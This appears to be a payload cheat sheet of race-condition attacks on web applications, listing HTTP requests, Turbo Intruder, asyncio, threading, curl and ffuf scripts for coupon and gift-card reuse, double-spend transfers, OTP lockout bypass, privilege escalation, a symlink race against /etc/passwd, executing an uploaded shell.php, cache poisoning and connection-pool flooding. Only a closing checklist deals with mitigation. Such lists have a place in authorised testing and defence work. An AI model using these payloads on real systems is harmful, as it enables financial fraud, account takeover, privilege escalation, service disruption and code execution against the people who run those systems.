meta.name: Race Condition Attacks
meta.description: Race condition payloads and proof-of-concept templates for limit overrun, TOCTOU, and concurrent request attacks.

payloads.code:
GET /api/coupon/apply?code=SAVE50 HTTP/1.1
# Send 20 simultaneous requests via Turbo Intruder last-byte sync
payloads.description: Limit-overrun: apply single-use coupon multiple times via parallel requests

payloads.code:
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"from":"accountA","to":"accountB","amount":1000}
# Race 10-50 identical requests — balance check and debit not atomic
payloads.description: Double-spend: race account transfer to overdraw balance beyond limit
Vote/like counter race: cast multiple votes with one account
Gift card redemption race: redeem same code multiple times for duplicate credit

payloads.code:
# Turbo Intruder last-byte sync technique (Python/Burp)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, pauseMarker=['\r\n\r\n'], learn=0)
    engine.openGate('1')
payloads.description: Turbo Intruder last-byte synchronization for precise race window exploitation

payloads.code:
import asyncio, aiohttp
async def race(url, data, n=20):
    async with aiohttp.ClientSession() as s:
        tasks = [s.post(url, json=data) for _ in range(n)]
        return await asyncio.gather(*tasks)
asyncio.run(race('https://target.com/api/apply', {'code':'PROMO50'}))
payloads.description: Python asyncio parallel POST race — send N requests simultaneously

payloads.code:
# HTTP/2 single-packet attack — all requests in one TCP frame
curl --http2 -X POST https://target.com/api/redeem \
  -H 'Content-Type: application/json' \
  -d '{"code":"GIFT123"}' &
# Repeat 20x, all queued before server processes any
payloads.description: HTTP/2 single-packet attack: fits multiple requests in one frame, near-zero jitter

payloads.code:
GET /reset-password?token=abc123 HTTP/1.1
# Race token check + invalidation — use token twice before it expires
payloads.description: Password reset token race: use a single-use token multiple times before invalidation

payloads.code:
# TOCTOU: check file existence then write — race between check and write
# Attacker creates symlink between check and write operations
ln -s /etc/passwd /tmp/upload_1234
# Server checks /tmp/upload_1234 (passes), then writes to target via symlink
payloads.description: TOCTOU symlink race: create symlink between file existence check and write operation

payloads.code:
POST /api/withdraw HTTP/1.1
{"amount": 100}
# T1: balance check (reads 100) → T2: balance check (reads 100) → T1: debit → T2: debit
# Result: 200 withdrawn from 100 balance
payloads.description: Classic TOCTOU withdraw: two concurrent reads before either write commits

payloads.code:
# Multi-endpoint race: Step 1 and Step 2 of different workflows
# Race POST /confirm-order with GET /cancel-order
# If cancel processes after confirm check but before stock decrement → free item
payloads.description: Multi-endpoint race: interleave two different API flows to exploit ordering assumptions

payloads.code:
# Race account state change:
# Endpoint A: /api/upgrade-plan (sets role=premium)
# Endpoint B: /api/create-content (checks role)
# Race B immediately after A — B executes before DB write from A commits
payloads.description: Account state race: exploit window between privilege grant and DB commit

payloads.code:
# Registration + login race
# 1. POST /register {user: alice} — triggers email verification pending
# 2. Simultaneously POST /login {user: alice, pass: x}
# Race window: user exists in DB but email_verified=false not yet set
payloads.description: Registration bypass race: login before email verification flag is written

payloads.code:
ffuf -u https://target.com/api/apply -X POST \
  -H 'Content-Type: application/json' \
  -d '{"code":"PROMO"}' \
  -w /dev/null -t 50 -rate 0
payloads.description: ffuf parallel race using high thread count and zero rate limit

payloads.code:
# Burp Suite Repeater — Send group in parallel
# 1. Add 20 identical requests to Repeater group
# 2. Right-click group → 'Send group in parallel (single-packet attack)'
# Works best with HTTP/2 targets
payloads.description: Burp Repeater parallel group send — built-in single-packet race technique

payloads.code:
POST /api/session/elevate HTTP/1.1
Authorization: Bearer <low_priv_token>
{"action": "become_admin"}
# Race 30 requests — privilege check and flag set not in same transaction
payloads.description: Privilege escalation race: concurrent elevation requests during non-atomic check-then-set

payloads.code:
# OTP/2FA bypass race
# 1. POST /login/otp {code: 123456} — OTP validated, session created
# 2. Race 30 requests with wrong OTP simultaneously
# Race window: if rate-limit counter increments non-atomically → bypass lockout
payloads.description: OTP rate-limit bypass race: concurrent attempts before lockout counter commits

payloads.code:
import threading
results = []
def send(session, url):
    r = session.post(url, json={'code': 'ONCE'})
    results.append(r.json())
threads = [threading.Thread(target=send, args=(requests.Session(), URL)) for _ in range(20)]
[t.start() for t in threads]; [t.join() for t in threads]
payloads.description: Python threading race PoC using shared session for concurrent requests
Browser-side JS Promise.all race PoC — useful for CSWSH + race combo

payloads.code:
# Detect race window with timing analysis
# 1. Baseline: measure single request latency (e.g. 120ms)
# 2. Look for operations with check-then-act pattern in source/docs
# 3. Target: non-atomic DB reads (SELECT ... then UPDATE separately)
# 4. Ideal window: >1ms (network jitter < window)
payloads.description: Race window detection methodology: identify TOCTOU patterns via timing and source analysis

payloads.code:
# File upload race condition
# 1. Upload malicious file (e.g. shell.php) — server scans then deletes
# 2. Race GET /uploads/shell.php between upload complete and scan/delete
for i in $(seq 1 100); do curl -s https://target.com/uploads/shell.php & done; wait
payloads.description: File upload scan race: execute uploaded file before antivirus scan deletes it

payloads.code:
# Cache poisoning via race
# Race two requests with different Host headers to same CDN cache key
# If CDN caches between first request headers and content write → poison cache
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
payloads.description: Cache poisoning race: exploit CDN caching timing to poison response with attacker host

payloads.code:
# Session fixation + race
# 1. Attacker gets session ID before victim logs in
# 2. Victim authenticates — server regenerates session (brief window)
# 3. Race requests with old session ID during regeneration window
payloads.description: Session regeneration race: use old session ID during brief regeneration window

payloads.code:
# Inventory race condition
POST /api/purchase HTTP/1.1
{"product_id": 999, "qty": 1}
# Race 30 requests when stock=1 — oversell if inventory check not locked
# Result: negative inventory, multiple orders fulfilled
payloads.description: Inventory oversell race: purchase more than available stock via concurrent requests

payloads.code:
# Referral bonus race
POST /api/referral/claim HTTP/1.1
{"referral_code": "FRIEND123"}
# Race 20 requests — referral marked used after bonus credited, not before
payloads.description: Referral bonus double-claim race: claim referral reward multiple times before code marked used

payloads.code:
# Connection pool exhaustion via race
# Send 1000 slow requests to exhaust DB connection pool
# Causes legitimate race conditions in connection acquisition logic
for i in $(seq 1 1000); do
  curl -s --max-time 30 'https://target.com/api/slow-query' &
done; wait
payloads.description: Connection pool exhaustion: flood with slow requests to induce race conditions in pool management

payloads.code:
# GraphQL batching race
POST /graphql HTTP/1.1
[
  {"query":"mutation { redeemCoupon(code: \"SAVE50\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50\") { success } }"},
  {"query":"mutation { redeemCoupon(code: \"SAVE50\") { success } }"}
]
payloads.description: GraphQL batching race: send multiple identical mutations in one request for internal race

payloads.code:
# Mitigation testing checklist
# [ ] SELECT ... FOR UPDATE / row-level locking?
# [ ] Atomic DB operations (INCR, CAS, transactions)?
# [ ] Idempotency keys on APIs?
# [ ] Rate limiting with Redis INCR (atomic)?
# [ ] Optimistic locking with version fields?
# [ ] Distributed locks (Redis SETNX, Redlock)?
payloads.description: Race condition mitigation checklist: verify atomic operations, locking, and idempotency
